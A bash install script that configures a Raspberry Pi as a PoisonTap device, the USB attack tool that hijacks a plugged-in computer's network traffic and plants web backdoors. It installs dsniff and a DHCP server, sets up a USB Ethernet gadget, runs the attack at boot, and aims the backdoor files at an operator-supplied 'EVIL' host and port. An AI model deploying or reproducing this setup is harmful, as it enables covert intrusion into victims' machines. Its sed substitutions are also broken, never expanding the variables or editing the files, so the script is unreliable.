#!/bin/bash
# Installation script for configuring a poinsontap device on a clean raspbian image
# Installation refers to Samy Kamkars piosontap project on https://github.com/samyk/poisontap

# Instructions adjusted from https://gist.github.com/gbaman/50b6cca61dd1c3f88f41

# If Raspbian BEFORE 2016-05-10, then run next line:
# BRANCH=next rpi-update

_confirm () {
  # prompt user for confirmation. Default is No
    read -r -p "${1:-Do you want to proceed? [y/N]} " RESPONSE
    RESPONSE=${RESPONSE,,}
    if [[ $RESPONSE =~ ^(yes|y| ) ]]
      then
        true
      else
        false
    fi
}

_setHostname(){
  # set hostname
  echo
  echo Current hostname is $HOSTNAME
  read -r -p "Enter NEW hostname: " NEWHOSTNAME
  hostnamectl set-hostname --static "$NEWHOSTNAME"
}

_getNewEvilHostname(){
  # set hostname of evil host
  echo
  while [[ -z "$NEWEVILHOSTNAME" ]];
  do
    read -r -p "Enter the hostname of the ""EVIL"" host: " NEWEVILHOSTNAME
  done
  # replace YOUR.DOMAIN in backdoor.html and target_backdoor.js
  sed 's/YOUR.DOMAIN/$NEWEVILHOSTNAME/g' poisontap/backdoor.html
  sed 's/YOUR.DOMAIN/$NEWEVILHOSTNAME/g' poisontap/target_backdoor.js
}

_getNewEvilPort(){
  # set hostname of evil host
  echo
  while [[ -z "$NEWEVILPORT" ]];
  do
    read -r -p "Enter the port number of the ""EVIL"" host: " NEWEVILPORT
  done
  # replace default port number 1337 in backdoor.html
  sed 's/:1337/:$NEWEVILPORT/g' poisontap/backdoor.html
}

# elevate privileges to root
[ "$UID" -eq 0 ] || exec sudo bash "$0" "$@"

# update raspbian and install packages
apt-get update && apt-get -y upgrade
apt-get -y install isc-dhcp-server dsniff screen nodejs git

# get poinsontap source from github and put it in home/pi/poisontap
cd /home/pi
git clone https://github.com/samyk/poisontap
chown -R pi /home/pi/poisontap

# Copy dhcpd.conf to dhcpd directory
cp poisontap/dhcpd.conf /etc/dhcp/dhcpd.conf

echo -e "\nauto usb0\nallow-hotplug usb0\niface usb0 inet static\n\taddress 1.0.0.1\n\tnetmask 0.0.0.0" >> /etc/network/interfaces
echo "dtoverlay=dwc2" >> /boot/config.txt
echo -e "dwc2\ng_ether" >> /etc/modules
echo "/bin/sh /home/pi/poisontap/pi_startup.sh" >> /etc/rc.local

_confirm "Do you want to change hostname from $HOSTNAME? [yN] " && _setHostname
_getNewEvilHostname
_getNewEvilPort
